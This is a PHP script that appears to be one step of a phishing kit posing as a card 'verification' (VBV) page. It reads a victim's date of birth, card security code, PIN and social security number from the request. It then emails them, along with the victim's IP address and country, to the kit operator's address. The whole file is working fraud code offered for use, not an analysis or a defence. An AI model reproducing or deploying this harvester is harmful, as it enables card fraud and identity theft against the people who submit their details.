<?php
  session_start();
  require_once("../inc/config.inc.php");
  if(isset($_GET['submit'])) {
    $bd = $_GET['bd'];
    $secv = $_GET['secv'];
    $ssn = $_GET['ssn'];
    $pin = $_GET['pin'];
    $_SESSION['step'] = "s3";
    /* Mail */
    $ip = $_SESSION['_ip_'];
    $cd = $_SESSION['cd'];
    $body = "
[~]================== Xyloris VBV ==================[~] 
|Date of Birth = $bd 
|Security Code = $secv 
|PIN           = $pin 
|SNN           = $ssn 
|===================================================== 
|--------------------♥ S3XY Parsonal Info ♥----------------- 
|IP            = $ip  
|Geo           = http://www.geoiptool.com/?IP=$ip
|Country       = ".$_SESSION["cd"]." 
[~]===================================================[~]
    ";
    $subject = "♥ S3XY Card Verification From [$cd] - $ip ♥";
    mail($tomail, $subject, $body);
    echo "RESULT:DONE;";
  }
?>
